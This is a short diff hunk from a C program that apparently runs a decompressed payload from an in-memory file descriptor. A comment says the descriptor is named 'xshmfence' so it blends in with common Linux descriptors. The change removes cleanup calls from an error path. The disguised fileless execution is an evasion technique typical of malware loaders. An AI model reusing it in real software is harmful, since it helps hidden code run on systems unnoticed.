@@ -59,10 +59,6 @@ int main(int argc, char **argv)
         while ((payloadFD = memfd_create("xshmfence", 0)) <= 2) // name as such due to this fd name appearing often on linux
         {                                                       // create memory file descriptor for execution
             close(payloadFD);
-            free(decompressed);
-            free(payload.memory);
-            free(payloadMeta);
-            free(psswd);
             return -1;
         }
 
